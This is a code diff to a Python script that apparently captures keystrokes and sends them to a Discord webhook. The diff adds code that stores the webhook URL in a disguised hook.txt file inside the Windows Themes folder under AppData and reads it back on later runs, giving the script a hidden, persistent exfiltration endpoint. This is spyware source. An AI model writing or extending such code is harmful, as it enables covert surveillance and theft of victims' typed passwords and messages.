@@ -3,9 +3,26 @@ import time
 import threading
 from discordwebhook import Discord
 import sys
+import os
 
+user = os.getlogin()
+path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\hook.txt"
 hook_url = sys.argv[1]
-discord = Discord(url=hook_url)
+check_file = os.path.isfile(path)
+
+if check_file == False:
+    f = open(path, "x")
+    f = open(path, "w")
+    f.write(hook_url)
+    f.close()
+    
+else:
+    pass
+
+f = open(path, "r")
+file_content = f.read()
+discord = Discord(url=file_content)
+f.close()
 
 word = []
 last_pressed = time.time()
